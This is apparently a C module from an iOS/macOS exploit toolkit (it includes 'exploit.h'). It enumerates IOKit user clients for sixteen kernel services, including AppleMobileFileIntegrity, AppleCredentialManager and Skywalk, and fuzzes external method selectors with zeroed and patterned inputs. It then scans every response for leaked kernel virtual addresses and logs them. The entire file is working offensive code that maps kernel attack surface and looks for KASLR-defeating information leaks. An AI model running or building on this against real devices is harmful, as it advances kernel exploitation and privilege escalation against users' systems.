#include "exploit.h"
#include <IOKit/IOKitLib.h>

static const char *deep2_targets[] = {
    "CoreAnalyticsHub",
    "IOTimeSyncDomain",
    "IOTimeSyncTranslationMach",
    "IOTimeSyncDaemonService",
    "AppleMobileFileIntegrity",
    "CCLogStream",
    "CCDataStream",
    "CCPipe",
    "CCFaultReporter",
    "AppleCredentialManager",
    "IOSkywalkNetworkBSDClient",
    "IOSkywalkKernelPipeBSDClient",
    "IOTimeSyncRootService",
    "IOTimeSyncClockManager",
    "IOTimeSyncgPTPManager",
    "IOTimeSyncTimeSyncTimePort",
};
#define DEEP2_NTARGETS 16

static int deep2_count = 0;
static int deep2_kva_count = 0;

static int deep2_is_target(const char *name) {
    for (int i = 0; i < DEEP2_NTARGETS; i++)
        if (strcmp(name, deep2_targets[i]) == 0) return 1;
    return 0;
}

static uint64_t deep2_find_kva(const uint8_t *buf, size_t len) {
    for (size_t i = 0; i + 8 <= len; i += 8) {
        uint64_t v = *(const uint64_t *)(buf + i);
        uint32_t hi = (uint32_t)(v >> 32);
        if ((hi == 0xfffffff0 || hi == 0xffffffe0 || hi == 0xfffffe00 || hi == 0xffffff80)
            && v != 0)
            return v;
    }
    return 0;
}

static void deep2_map_service(io_service_t svc, const char *name) {
    static uint8_t zero_in[512];
    static uint8_t pat_in[512];
    static uint8_t out[8192];
    static const size_t sizes[] = {0, 16, 64, 256, 512};
    memset(zero_in, 0, sizeof(zero_in));
    memset(pat_in, 0x41, sizeof(pat_in));

    nk_log("[deep2] %s: mapping sel 0..63 x types 0..3 x inputs", name);
    for (int type = 0; type < 4; type++) {
        io_connect_t conn = 0;
        if (IOServiceOpen(svc, mach_task_self(), type, &conn) != KERN_SUCCESS)
            continue;

        for (int sel = 0; sel < 64; sel++) {
            for (int si = 0; si < 5; si++) {
                size_t out_sz = sizeof(out);
                memset(out, 0, sizeof(out));
                kern_return_t kr = IOConnectCallStructMethod(
                    conn, sel, zero_in, sizes[si], out, &out_sz);
                int nz = 0;
                for (size_t i = 0; i < out_sz && i < sizeof(out); i++)
                    if (out[i]) { nz = 1; break; }
                uint64_t kva = deep2_find_kva(out, out_sz < sizeof(out) ? out_sz : sizeof(out));
                if (kr == KERN_SUCCESS && nz) {
                    deep2_count++;
                    if (kva) {
                        deep2_kva_count++;
                        nk_log("[deep2] KVA FOUND! %s t=%d sel=%d in=%zu out=%zu kva=0x%016llx head=%02x%02x%02x%02x%02x%02x%02x%02x",
                            name, type, sel, sizes[si], out_sz, kva,
                            out[0],out[1],out[2],out[3],out[4],out[5],out[6],out[7]);
                    } else {
                        nk_log("[deep2] %s t=%d sel=%d in=%zu kr=0 out=%zu head=%02x%02x%02x%02x%02x%02x%02x%02x",
                            name, type, sel, sizes[si], out_sz,
                            out[0],out[1],out[2],out[3],out[4],out[5],out[6],out[7]);
                    }
                }
            }
            size_t out_sz = sizeof(out);
            memset(out, 0, sizeof(out));
            kern_return_t kr = IOConnectCallStructMethod(
                conn, sel, pat_in, 64, out, &out_sz);
            int nz = 0;
            for (size_t i = 0; i < out_sz && i < sizeof(out); i++)
                if (out[i]) { nz = 1; break; }
            uint64_t kva = deep2_find_kva(out, out_sz < sizeof(out) ? out_sz : sizeof(out));
            if (kr == KERN_SUCCESS && nz) {
                deep2_count++;
                if (kva) {
                    deep2_kva_count++;
                    nk_log("[deep2] KVA FOUND! %s t=%d sel=%d in=64pat out=%zu kva=0x%016llx head=%02x%02x%02x%02x%02x%02x%02x%02x",
                        name, type, sel, out_sz, kva,
                        out[0],out[1],out[2],out[3],out[4],out[5],out[6],out[7]);
                } else {
                    nk_log("[deep2] %s t=%d sel=%d in=64pat kr=0 out=%zu head=%02x%02x%02x%02x%02x%02x%02x%02x",
                        name, type, sel, out_sz,
                        out[0],out[1],out[2],out[3],out[4],out[5],out[6],out[7]);
                }
            }
        }
        IOServiceClose(conn);
    }
}

void nk_deep2_run(void) {
    nk_rule();
    nk_log("[deep2] extended surface deep map (analytics, timesync, AMI, skywalk)");
    deep2_count = 0;
    deep2_kva_count = 0;

    CFMutableDictionaryRef matching = IOServiceMatching("IOService");
    io_iterator_t it = 0;
    if (IOServiceGetMatchingServices(kIOMasterPortDefault, matching, &it) != KERN_SUCCESS) {
        nk_log("[deep2] registry iterator failed");
        nk_rule();
        return;
    }
    io_service_t svc;
    while ((svc = IOIteratorNext(it))) {
        io_name_t name;
        if (IORegistryEntryGetName(svc, name) == KERN_SUCCESS) {
            if (deep2_is_target(name))
                deep2_map_service(svc, name);
        }
        IOObjectRelease(svc);
    }
    IOObjectRelease(it);

    nk_log("[deep2] done: %d non-zero responses, %d kernel VA found", deep2_count, deep2_kva_count);
    nk_rule();
}
